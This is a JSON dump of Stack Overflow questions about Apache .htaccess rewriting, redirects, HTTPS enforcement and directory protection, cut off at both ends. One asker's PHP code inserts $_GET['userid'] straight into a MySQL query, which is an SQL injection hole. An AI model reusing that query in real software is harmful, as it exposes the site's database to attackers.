</p>\n"},{"tags":["php",".htaccess","mod-rewrite","rule"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":12427173,"title":"Mod rewrite rule doesn't work","body":"<p>I'm working with mod rewrite, but my code doesn't work. It worked for a time.\nI have stripped the code.</p>\n\n<p><em>.htaccess</em></p>\n\n<pre><code>RewriteEngine On \nRewriteBase / \nRewriteRule ^/(.*)/$ index.php?test=$1\n</code></pre>\n\n<p><em>PHP</em></p>\n\n<pre><code>&lt;?php\nvar_dump($_GET['test']);\n?&gt;\n</code></pre>\n\n<p>If I go to the <code>index.php</code> it displays <code>NULL</code>.</p>\n\n<p>I don't understand why it doesn't work anymore. I hope you can help me.</p>\n\n<p>P.s. I have tested whether the .htaccess file is loaded by making a login form with .htaccess.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":12427209,"title":"If this kind of redirection possible with .htaccess?","body":"<p>Lets say I had file on my website on this path</p>\n\n<p>www.mysite.com/blah/images/picture.jpg</p>\n\n<p>and then I transferred it to other website like this</p>\n\n<p>www.my2ndsite.com/mysite/images/picture.jpg</p>\n\n<p>can we redirect visitors to get image from www.my2ndsite.com while they visit www.mysite.com</p>\n\n<p>Also if there is any command which first checks that if there at www.mysite.com that \"picture.jpg\" file exists. If its true then it just doesn't redirect visitors to www.my2ndsite.com .</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12426790,"title":"How secure is htaccess deny from all","body":"<p>I have a file that I don't want to be accessed by anyone except my own server (by php request). I am using the following in my .htaccess:</p>\n\n<pre><code>&lt;Files myfile.xml&gt;\n    Order Deny,Allow\n    Deny from all\n    Allow from localhost\n&lt;/Files&gt;\n</code></pre>\n\n<p>But was wondering, how secure is this? Is there anyway that someone might be able to get around this and get to the file directly?\nIn my php file I have:</p>\n\n<pre><code>simplexml_load_file(\"myfile.xml\")\n</code></pre>\n\n<p>To get the data and also am using</p>\n\n<pre><code>if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp; strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')\n</code></pre>\n\n<p>So no one can access that file directly (only by Ajax)\nWhat do you guys think about using this method?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12425911,"title":"Redirecting image links to a php file?","body":"<p>How to re-write a direct linked image link to point to a php file?</p>\n\n<p>from http ://...../picture.jpg to http ://....../load.php?file= picture.jpg</p>\n\n<p>Can it be done using mod_rewrite?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":12425575,"title":"htaccess 301 from old site to new site","body":"<p>I have a client domain with thousands of pages that are moving to a new domain. The naming convention of the .html has changed, and I know htaccess can handle this somehow.</p>\n\n<p>Here's an example:</p>\n\n<p>old site:\n<a href=\"http://oldsite.com/state/cityname-index.html\" rel=\"nofollow\">http://oldsite.com/state/cityname-index.html</a></p>\n\n<p>new site:\n<a href=\"http://newsite.com/state/computer-support-cityname-index.html\" rel=\"nofollow\">http://newsite.com/state/computer-support-cityname-index.html</a></p>\n\n<p>This is beyond my understanding at the moment. I'd appreciate a little help. Thanks!</p>\n"},{"tags":["php",".htaccess","zend-framework","web-security","phtml"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":70,"score":-1,"question_id":12422860,"title":"Zend project : Do not permit the source code displaying","body":"<p>This morning, I was afraid when I discovered that it is possible to display by default the <code>http://www.mydomain.com/application/configs/application.ini</code> file of my Zend project!</p>\n\n<p>And more disturbing, it is possible to display the php source code of the <code>.phtml</code> page when pointing the final URL like <code>http://www.mydomain.com/application/views/scripts/index/index.phtml</code></p>\n\n<p>Therefore, I really need to protect my web site. I am sure that it is possible to prevent the <code>.ini</code> file and source code displaying using the right syntax of the main <code>.htaccess</code> located in the <code>public</code> folder.</p>\n\n<p>Could you help me?</p>\n\n<p>I thought about this kind of syntax, but I won't copy the <code>.htaccess</code> file into all my folder. I would like write the rule only into one file.</p>\n\n<pre><code>RewriteEngine on \nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?localhost [NC] \nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?localhost.*$ [NC] \nRewriteRule .*\\.(phtml|php)$ - [F]\n</code></pre>\n\n<p><strong>EDIT</strong>\nMy directory structure is : </p>\n\n<pre><code>ProjectDir\n |_application\n | |_configs\n | |_controllers\n | |...\n |\n |_public\n | |_index.php\n | |_css\n | |_js\n | |_.htaccess\n |\n |_library\n   |_Zend\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":8613358,"title":"how to turn *.htm to *.php in htaccess","body":"<p>I have read more than 3 questions here in stackoverflow about this, but all of them has one of the below problems:</p>\n\n<ul>\n<li>It redirects php to htm (not found appears, I already have php files in place)</li>\n<li>When you type *.htm, it will be redirected to *.php (I want visitors to see *.htm not *.php)</li>\n</ul>\n\n<p>Let me boil it down for you guys: I need to type index.htm and apache redirects that to .php but in the address bar I still want to see .htm not .php</p>\n\n<p>Any help or suggestion would be appreciated.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12422270,"title":"Use mod_rewrite to simulate Facebook style URLs","body":"<p>What I want the address bar to show:</p>\n\n<pre><code>http://facebook.com/user\n\nhttp://facebook.com/user/ -&gt; http://facebook.com/user\n\nhttp://facebook.com/user/photos -&gt; http://facebook.com/user/photos\n</code></pre>\n\n<p>My rewrite rules:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^(.+)/$ $1 [NC]\nRewriteRule ^([A-Za-z0-9_-]+)/?([A-Za-z0-9_-]*)$ user.php?id=$1&amp;second=$2 [NC,L]\n</code></pre>\n\n<p>What happens:</p>\n\n<pre><code>1). http://domain.com/user (working well)\n\n2). http://domain.com/user/ (keeps the / in the address bar and destroys css/js/img paths)\n\n3). http://domain.com/user/photos (same result as 2, correct except the paths)\n</code></pre>\n\n<p>If I use <code>&lt;base href=\"...\"&gt;</code> to force the paths the page displays correctly. But I want to solve my problem without it.</p>\n\n<p>How can I remove the trailing slash in the address bar? The rewriting seem to be working like intended.</p>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12421416,"title":"How to rewrite my url parameter with htaccess?","body":"<p>I have the following url:</p>\n\n<pre><code>http://example.com/folder/index.php?module=centrale&amp;DIO0=1\n</code></pre>\n\n<p>I need this page to be availeble with the following URL format:</p>\n\n<pre><code>http://example.com/folder/centrale/?DIO0=1\n</code></pre>\n\n<p>But how do i rewrite this using htaccess properly? What i've got so far:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^centrale/(.*)$ /index.php?module=centrale ????? $1\n</code></pre>\n\n<p>Notice that the <code>DIO0</code> parameter is not always the only one, so the query string must be completly passed trough. Thanks in advance for helping me out or setting me in the right direction.</p>\n\n<p>Edit: the htaccess file is located here: <code>http://example.com/folder/</code></p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","directory-tree"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12416381,"title":"Pointing to subfolder via .htaccess doesn't work","body":"<p>I'm working on a WP based site.\nI have the site of the client on my space (www.mydomainname.com/~subfolder/sub-subfolder).\nNow the original domain of the client is pointing to my space (www.clientdomain.com goes directly on the www.domainname.com/~subfolder/) without changing url name. \nBut, whent it happens, the server answer giving a directory tree. I would need the site to point directly to sub-subfolder (not to ~subfolder) without giving the directory tree. </p>\n\n<p>I have used this .htaccess: </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nOptions +FollowSymlinks  \n\nRewriteEngine on\n\nRewriteBase /\n\nRewriteCond &amp;#37;{HTTP_HOST} ^(www\\.)?mydomainname\\.cc [NC]\n\nRewriteRule .? http://www.mydomainname.cc/~subfolder/ [R=301,L]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>How can I do it? I'm sure I'm doing the same error but I can't find it...\nPlease help me I'm going crazy!!! :)</p>\n\n<p>Thank you! </p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12421512,"title":"htaccess file config issue in subdomain","body":"<p>I'm new to Stackoverflow and need to find a solution for the following issue. I want to remove .php extension from files and to rename the url only with the file name as below.</p>\n\n<p>Ex. if the file is www.yourdomain.com/contact.php, I need to set the URL as www.yourdomain.com/contact. </p>\n\n<p>I'm adding the application in a sub domain. I used the following code in the htaccess file. But it doesn't work. </p>\n\n<pre><code>Options +FollowSymlinks\n\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_FILENAME}\\.php -f\n  RewriteRule ^(.*)$ $1.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Please let me know how to fix this.</p>\n\n<p>Thanks in advance!\nSam</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":35,"score":0,"question_id":12420830,"title":"htaccess rewriting for root to sub directory","body":"<p>I want to point my subdirectory folder like this </p>\n\n<p>www.FOLDERNAME.SITE_NAME.net</p>\n\n<p>and write now its working like this</p>\n\n<p>www.SITE_NAME.net/FOLDER_NAME</p>\n\n<p>I already made a domain for my folder </p>\n\n<p>I tried many htaccess but no luck at all.</p>\n\n<p>Any help will be highly appreciated. </p>\n"},{"tags":[".htaccess","http","https"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":54,"score":-2,"question_id":12418535,"title":"htaccess rewrite - rewrite http folder to https folder","body":"<p>Just like in title. \nI would like to redirect whole folder (in this example it will be /w1/) from http to https.\nHow to redirect this: <a href=\"http://testdomain.com/system\" rel=\"nofollow\">http://testdomain.com/system</a><strong>/w1/</strong>(and all with that folder) to this: <a href=\"https://testdomain.com/system\" rel=\"nofollow\">https://testdomain.com/system</a><strong>/w1/</strong>(and all with that folder). So for example <a href=\"http://testdomain.com/system/w1/w1_input.php\" rel=\"nofollow\">http://testdomain.com/system/w1/w1_input.php</a> will be redirected to <strong>https</strong>://testdomain.com/system/w1/w1_input.php</p>\n\n<p>I was tring to use that kind of rule: </p>\n\n<pre><code>RewriteCond %{HTTPS} !=on\nRewriteRule ^/w1(.*)$ https://testdomain.com/system/w1/$1 [R=301,L]\n</code></pre>\n\n<p>But this did nothing</p>\n"},{"tags":["php","ios","xcode",".htaccess","nsurlconnection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12417905,"title":"HTTP Post, HTAuth, and NSUrlConnection","body":"<p>In an app I am working on, I need to upload a file to a server using a php script and NSUrlConnection. I got the code and it works fine. Since I need authentication, I added htaccess to the directory. I implemented the delegate method for authentication in the app. In a browser, when going to the php script, it prompts for authentication. However, when I upload to the directory, it doesn't even call the delegate method, and it uploads anyways, no problems whatsoever. I am thinking that I might need to add some code to the php script, but I don't know what. Please help!</p>\n"},{"tags":[".htaccess","if-statement","user-agent"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12402767,"title":".htaccess: Enable directory indexing for a certain user agent","body":"<p>The issue: I want to enable directory indexing for a certain directory on my server (it's disabled by default) only for a certain user agent.</p>\n\n<p>I know that there are &lt;If&gt; instructions that can be used in a .htaccess file, but I have not managed to get a result.</p>\n\n<p>What I'm looking for is something along these lines:</p>\n\n<pre><code>&lt;If user-agent = 'a certain user agent'&gt;\n    Options +Indexes\n&lt;/if&gt;\n</code></pre>\n\n<p>I know that there are environment variables that can be set based on various conditions (like a certain user agent) and <em>I have been able to set them according to my needs</em>, bu I was not able to do a simple \"if variable is set, then set Options +Indexes\" statement</p>\n\n<p>Suggestions? Pointers? Is this even possible? I do not have access to the Apache global configuration file.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":40,"score":1,"question_id":12415258,"title":"What's Wrong? Nothing Will Load (Almost)!","body":"<p>Okay...My title is a bit of an exaggeration...</p>\n\n<p>My site is built in PHP, and all the files I'm trying to \"require_once\" aren't being loaded.  The only file I've changed is my .htaccess file.  I don't know a thing about .htaccess and what I have is purely from searching the web.  What is wrong?  Thanks for any help in advance.</p>\n\n<pre><code>RewriteEngine on\n\n&lt;Files 403.shtml&gt;\norder allow,deny\nallow from all\n&lt;/Files&gt;\nReWriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nReWriteRule !index.php index.php [L]\n</code></pre>\n\n<p>Also, if I comment out the bottom two lines, my site works great.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12415934,"title":"Htaccess rewrite for user profile and possible conflictions","body":"<p>I need to ask something about htaccess redirection. I know there are lots of questions about htaccess, rewrite and pretty profile urls, but I've never found real answer of my question and I hope I can find with your help.</p>\n\n<p>That pretty url rules as you know would work like changing \"mydomain.com/profile.php?username=myuser\" to \"mydomain.com/myuser\".</p>\n\n<p>But let's say I have a rewrite rule for my login url :  www.mydomain.com/login </p>\n\n<p>That means if user try to have exact same username as \"login\" how could you handle that possible confliction on rewrite? </p>\n\n<p>actually possible solution might be minimum character limitation like minimum 6 chars, but it's not looking elegant since you loose your option to use more than 6 chars like \"/resetpassword\".</p>\n\n<p>Probably a \"banned words\" kind of array control would be a solution when user picks a username but then you need to foresee all kind of possibilities which shouldn't be used.</p>\n\n<p>Many of giant websites use this rewrite methods. Particularly Facebook uses \"/username\" kind of rule for pages and users in the same time. </p>\n\n<p>Anyway, if someone has what is the magic behind that kind of url redirection/rewrite rules please help me out on this :)</p>\n\n<p>Thanks</p>\n\n<p>P.S. : I know there is another solution like \"/user/username\" but nowadays pointing directly to the base url and shortening full url is getting more and more popular, and I just need to understand possibilities on that.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12414665,"title":"URL Rewriting with .HTACCESS not working in php","body":"<p>My URL looks like this: </p>\n\n<pre><code>http://127.0.0.1/website/comments.php?topic_id=16\n</code></pre>\n\n<p>I want to make it look like this:</p>\n\n<pre><code>http://127.0.0.1/website/comments/my-news-article/16.php\n</code></pre>\n\n<p>I have applied this</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^comments/([a-zA-Z0-9_-]+)/([0-9]+)\\.php$ comments.php?id=$2\n</code></pre>\n\n<p>I have also turned on <code>Rewrite_module</code> in Apache.</p>\n\n<p>But it's not working.</p>\n"},{"tags":["php",".htaccess","http-status-code-500"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12412633,"title":"PHP: 500 Error to error page","body":"<p>As a prelude, I know what a HTTP 500 is, and I know how to fix them. </p>\n\n<p>On PHP 5.3, i'm running a production environment with show_errors off. When there are any fatal errors, the user gets a plain white 500 page in response. I'm trying to create a 500 error page just in case there any any errors; just so it is more user friendly.</p>\n\n<p>I used to be able to do </p>\n\n<pre><code>ErrorDocument 500 500.html\n</code></pre>\n\n<p>It doesn't seem to be working anymore, however - even thought my 404</p>\n\n<pre><code>ErrorDocument 404 404.html\n</code></pre>\n\n<p>Works fine.</p>\n\n<p>Curious to see solutions regarding this -\nThank you for your time.</p>\n"},{"tags":["apache",".htaccess","xampp","localhost","http-status-code-500"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":226,"score":1,"question_id":12414201,"title":"xampp 1.8.1 doesn't show websites with .htaccess in folder","body":"<p>I used <strong>xampp 1.7.7</strong> with *\"Apache/2.2.11 (Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9 Server at localhost Port 80\"*, and everything works just fine. I wanted to migrate from xampp 1.7.7 to <strong>xampp 1.8.1</strong> with <em>\"Apache/2.4.2 (Win32) OpenSSL/1.0.1c PHP/5.4.4 Server at localhost Port 80\"</em>, i use <strong>.htaccess</strong> file with <strong>mod_rewrite.so</strong> module and everything worked fine with xampp 1.7.7 but when I switched to 1.8.1 in the directory structure of <code>http://localhost</code> <strong>I don't see folder with .htaccess file inside them, when i try to access those folders trough direct link like <code>http://localhost/example</code> it trows Error 500</strong></p>\n\n<p>LoadModule rewrite_module modules/mod_rewrite.so is unquoted</p>\n\n<p>Operating system is Windows 7</p>\n\n<p>what am I doing wrong</p>\n"},{"tags":["wordpress",".htaccess","http-status-code-404","opencart"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":297,"score":0,"question_id":12373047,"title":"Opencart ,wordpress SEO url htaccess 404","body":"<p>On a mod_rewrite enabled Apache server wordpress has been installed in the web root.</p>\n\n<p>In the subdirectory /webwinkel/ opencart has been installed.</p>\n\n<p>Now I am trying to create SEO url's in Opencart.</p>\n\n<p>I enabled SEO urls in Opencart admin and changed the .htaccess file.</p>\n\n<p>In the directory /webwinkel/  I renamed .htaccess.txt to .htaccess and changed RewriteBase to /webwinkel/ :</p>\n\n<pre><code>Options +FollowSymlinks\nOptions -Indexes\n\n&lt;FilesMatch \"\\.(tpl|ini|log)\"&gt;\n Order deny,allow\nDeny from all\n&lt;/FilesMatch&gt;\n\nRewriteEngine On\nRewriteBase /webwinkel/\nRewriteRule ^sitemap.xml$ index.php?route=feed/google_sitemap [L]\nRewriteRule ^googlebase.xml$ index.php?route=feed/google_base [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !.*\\.(ico|gif|jpg|jpeg|png|js|css)\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n</code></pre>\n\n<p>I now get a 404 page not found error when trying to access the webshop.</p>\n\n<p>Does anyone know how to solve this issue ?</p>\n"},{"tags":["php",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12409832,"title":"Using .htaccess for URL redirecting","body":"<p>So actually I am going to use .htaccess for having a clean url for my website, am still learning and figuring how to do it in a correct way so please don't be harsh reading my question...what I want to know is whether am doing something wrong or it's completely different approach compared to what I am doing..</p>\n\n<p>URL of user profile is like this : <code>www.mywebsite.com/profile.php?userid=21234567805</code></p>\n\n<p>Here I am passing the user id and fetching associated data on user's page using $_GET requests..</p>\n\n<p>Now here I am passing ID because all my queries are on user id like </p>\n\n<pre><code>mysqli_query($db_connect, \"SELECT username, first_name, last_name FROM tbl_users WHERE user_id='\".$_GET['userid'].\"' LIMIT 1\";\n</code></pre>\n\n<p>So what I want to know is that is it possible to make my url in anyway like this using user id or in order to achieve this I need to make everything using a username?</p>\n\n<p>I want it like this</p>\n\n<pre><code>www.mywebsite.com/profile/username\n</code></pre>\n\n<p>Or how like other websites do like this :</p>\n\n<pre><code>www.mywebsite.com/username\n</code></pre>\n\n<p>so do I need to use username instead of user id or userid is just ok ?</p>\n\n<p>Any help will be much appreciated.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12411140,"title":"When using .htaccess redirect, how do I test what the REQUEST_URI is?","body":"<p>I'm trying to do something really simple here but it's kicking my butt haha. I have my website, and I got a SSL certificate for it this morning. I want my users to be redirected to the secure site, but I only need the certificate for a certain portion of my website so I don't want to worry about everywhere else. The certificate is made to <code>domain.com</code> not <code>www.domain.com</code>. The part of my website where I need the certificate, all of the pages are in the <code>apps</code> directory. For example <code>domain.com/apps/login.php</code>. Here is what I have been putting in my .htaccess file.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} ^/apps/.*$\nRewriteCond %{HTTPS} !=on\nRewriteRule ^(.*)$ https://domain\\.com%{REQUEST_URI} [R=301,L]\n</code></pre>\n\n<p>Now I will explain what I think this should be doing and I would like to be told where I'm wrong haha.</p>\n\n<ul>\n<li><code>RewriteEngin On</code> - Allows redirects</li>\n<li><code>RewriteCond %{REQUEST_URI} ^/apps/.*$</code> - Checks if user is in the apps directory</li>\n<li><code>RewriteCond %{HTTPS} !=on</code> - Checks if user is already using https://</li>\n<li><code>RewriteRule ^(.*)$ https://domain\\.com%{REQUEST_URI} [R=301,L]</code> - Redirect</li>\n</ul>\n\n<p>This partially works. When I type in <code>www.domain.com/apps/login.php</code> it redirects to <code>https://domain.com/apps/login.php</code>. Perfect. But if I just type in <code>www.domain.com</code> it redirects to <code>https://domain.com</code>. So it seems that my line <code>RewriteCond %{REQUEST_URI} ^/apps/.*$</code> is broken. What do I need to put there to make it so that it only redirects to the secure site when they are in the <code>apps</code> directory?</p>\n"},{"tags":["php",".htaccess","url","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12385976,"title":"stop htaccess from rewrite in subfolder","body":"<p>i have problem with htaccess</p>\n\n<p>i make convert url to html from php</p>\n\n<p>but if any subfolder in domain all convert url to html</p>\n\n<p>i just need domain conert url and not in any subfolder</p>\n\n<p>this is my code</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^(.*)form.php(.*)$\nRewriteCond %{THE_REQUEST} ^[A-Z]+\\s([^\\s]+)\\.php\\s\nRewriteCond %{REQUEST_URI} !^(.*)form.php(.*)$\nRewriteRule .* %1.html [R=301,L]\nRewriteRule ^(.*)\\.html$ $1.php\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule ^.*$ - [L]\nRewriteRule ^index.php$ http://%{http_host} [R=301,L]\n</code></pre>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12412599,"title":"Accessing wordpress posts with nice urls using htaccess","body":"<p>i have a wordpress site that currently shows the posts like </p>\n\n<pre><code>http://mysite.com/index.php?p=1 \n</code></pre>\n\n<p>and now i wanna access the same thing by writing url as </p>\n\n<pre><code>http://mysite.com/1\n</code></pre>\n\n<p>what can be the rewrite rules to do that.. i saw the .htaccess that hides the index.php from the url and regular expressions but was not being able to properly do what is needed! </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12412290,"title":"Remove Last Character of URL with .htaccess","body":"<p>Somehow google managed to pickup some URLs on my site with a ) at the end which is causing a bunch of 404 links. The links look something like this: </p>\n\n<blockquote>\n  <p>\"http://mysite.com/page.php?id=42523\"</p>\n</blockquote>\n\n<p>but what google has in its search results is: </p>\n\n<blockquote>\n  <p>\"http://mysite.com/page.php?id=42523)\"</p>\n</blockquote>\n\n<p>Is there a way with .htaccess that I can determine if a url ends with ) and redirect it to the proper URL?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12404481,"title":"htaccess redirect on pattern","body":"<p>how can I have a pattern with regular expression using htaccess what would redirect all incoming links</p>\n\n<p>from <code>example.com/test-en/</code> to <code>example.com/test/</code></p>\n\n<p>it should be filtered out if after root domain name the string contains the suffix -en, if match redirect.</p>\n\n<p>here is the hole code what I'm trying to do</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} http://www.example.co.uk [NC]\n**RewriteRule ^tag/(.*)-en/$ http://www.example.co.uk/$1 [L,R=301]**\nRewriteRule ^\\d{4}/\\d{2}/\\d{2}/(.*)$ http://www.example.co.uk/$1 [L,R=301]\nRewriteRule ^\\d{4}/\\d{2}/(.*)$ http://www.example.co.uk/$1 [L,R=301]\n</code></pre>\n"},{"tags":[".htaccess","folders","protect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":12397618,"title":".htaccess to protect the folders of my website","body":"<p>I want to give a 301 error, when some people try to access for example</p>\n\n<p><a href=\"http://www.mypage.com/images\" rel=\"nofollow\">http://www.mypage.com/images</a> </p>\n\n<p>or anothe folder.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12403759,"title":"Exclude one file from a password protected subdomain","body":"<p>I've this .htaccess to protect a subdomain.</p>\n\n<pre><code>AuthType Basic\nAuthUserFile /home/xxx/dev.xxx.com/.htpasswd\nAuthName \"Dev\"\nrequire valid-user\n</code></pre>\n\n<p>How can I exclude only one file from this protection.\nThen this file could be accesible without password protection</p>\n"},{"tags":[".htaccess","iframe","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":62,"score":0,"question_id":12401469,"title":"How to access htpasswd-protected page automatically","body":"<p>I have a passwordprotected directory with htaccess and htpasswd. </p>\n\n<p>The htaccess looks like this</p>\n\n<pre><code>AuthUserFile /usr/local/you/safedir/.htpasswd\nAuthGroupFile /dev/null\nAuthName EnterPassword\nAuthType Basic\n\nrequire user myusername\n</code></pre>\n\n<p>The htpasswd looks like this</p>\n\n<pre><code>myusername:password887\n</code></pre>\n\n<p>This password protected directory is named www.mydomainname.com/mystuff</p>\n\n<p>Now, I want to access this page fram a iframe (with www.mydomain.com/mustuff/index.html as src) in index.php in my root, but I dont want to make the users fill in the username and password all the time, just keep them from entering the folder the src is in.</p>\n\n<p>Is there a script that can fill out the username and password automatically without letting the \"users\" write the username and password all the time?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12410153,"title":"Multilanguage site, subdirectories as language (RewriteRule) WHMCS","body":"<p>hi i went to make friendly urls for my web using RewriteRule as iam using whmcs and the scrpit is encoded here is what i want</p>\n\n<p><a href=\"http://www.xxx.com/index.php?language=english\" rel=\"nofollow\">http://www.xxx.com/index.php?language=english</a> \nto\n<a href=\"http://www.xxx.com/en/index.html\" rel=\"nofollow\">http://www.xxx.com/en/index.html</a></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12408289,"title":".htaccess mod rewrite regex to not match file names","body":"<p>I am using the following .htaccess configuration directives (to redirect all non filename requests to a single PHP file):</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteBase /\n\nRewriteRule !(\\.ttf|\\.eot|\\.woff|\\.xpi|\\.xml|\\.txt|\\.air|\\.exe|\\.zip|\\.pdf|\\.ico|\\.gif|\\.jpg|\\.png|\\.jpeg|\\.js|\\.swf|\\.css|\\.php|\\.html)$ mod_rewrite_redirector.php [L]\n</code></pre>\n\n<p><strong>How can I make the above regex case insensitive?</strong> I have tried [L,NC] or placing (?i) at the beggining. NC option doesn't work on all Apache2 installations (various versions) and (?i) has no effect.</p>\n\n<p><strong>How can I make a regex which will <em>not</em> match URLS which look like a filename with an extension between 2 and 4 characters?</strong></p>\n\n<p>Thank you for your help.</p>\n"},{"tags":["php","javascript",".htaccess","url-shortener"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12408048,"title":"Mathias URL shortener","body":"<p>I am using this URL shortener but I'm having a hard time setting it up.\n<a href=\"https://github.com/mathiasbynens/php-url-shortener\" rel=\"nofollow\">https://github.com/mathiasbynens/php-url-shortener</a></p>\n\n<p>I've setup the database, changed the config file accordingly. I put the files in a subdirectory and removed Rewritebase from the .htaccess file.</p>\n\n<p>I'm not sure what these two scripts mean if anyone could help?\n`## Favelets / Bookmarklets</p>\n\n<h3>Prompt</h3>\n\n<p>// js\n<code>javascript:(function(){var%20q=prompt('URL:');if(q){document.location='http://yourshortener.ext/shorten?url='+encodeURIComponent(q)}}());\n</code></p>\n\n<h3>Shorten this URL</h3>\n\n<p>// js\n<code>javascript:(function(){document.location='http://yourshortener.ext/shorten?url='+encodeURIComponent(location.href)}());\n</code></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":12405926,"title":"mod_rewrite - stop it appending a question mark and the original query","body":"<p>I've got a URL like this:</p>\n\n<pre><code>http://my.site/apps/123\n</code></pre>\n\n<p>which I'd like to redirect to </p>\n\n<pre><code>http://my.site/app/123\n</code></pre>\n\n<p>using mod_rewrite. However, when I use this .htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php)\nRewriteRule ^/apps/(.*)$ /app/$1 [R=301,L]\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>I get a 500 and this error in the logs:</p>\n\n<pre><code>Request exceeded the limit of 10 internal redirects due to probable configuration error. \nUse 'LimitInternalRecursion' to increase the limit if necessary. \nUse 'LogLevel debug' to get a backtrace.\n[Thu Sep 13 12:58:13 2012] [debug] core.c(3112): [client 127.0.0.1] 